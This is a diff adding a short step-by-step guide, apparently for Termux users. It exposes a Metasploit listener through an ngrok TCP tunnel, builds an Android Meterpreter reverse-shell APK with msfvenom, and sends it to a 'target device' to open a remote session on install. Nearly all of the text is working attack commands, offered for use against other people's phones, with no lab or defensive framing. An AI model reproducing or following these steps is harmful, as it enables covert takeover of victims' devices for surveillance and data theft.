@@ -1,0 +1,46 @@
+Install metasploit or Linux in sorce system
+
+download ngrok Ngrok:-https://drive.google.com/file/d/0B9zh...
+
+copy ngrok to the home of termux
+
+cp /sdcard/ngrok/ngrok $HOME
+
+give permission
+chmod +x ngrok
+
+follow the steps
+cd ..
+ls
+cp home/ngrok usr/bin
+cd Home
+
+copy and paste the text from ngrok's website and hit enter
+./ngrok authtoken ####################################
+(mention the token obtained after registration in ngrok)
+
+
+ngrok tcp 4444
+now connection setup done
+
+now go to another session
+go inside metasploit framework
+cd metasploit-framework
+
+Command to generate the APK
+
+./msfvenom -p android/meterpreter/reverse_tcp LHOST="Copy from Ngrok's Session" LPORT="Copy from Ngrok's Session" R > /sdcard/testWan.apk
+
+go to APK builder and build the app
+
+send to the target device and after install connection established
+
+./msfconsole
+use exploit/multi/handler
+set payload android/meterpreter/reverse_tcp
+set lhost localhost
+set lport 4444
+exploit
+
+now after installation it will connect to the target device and type
+help
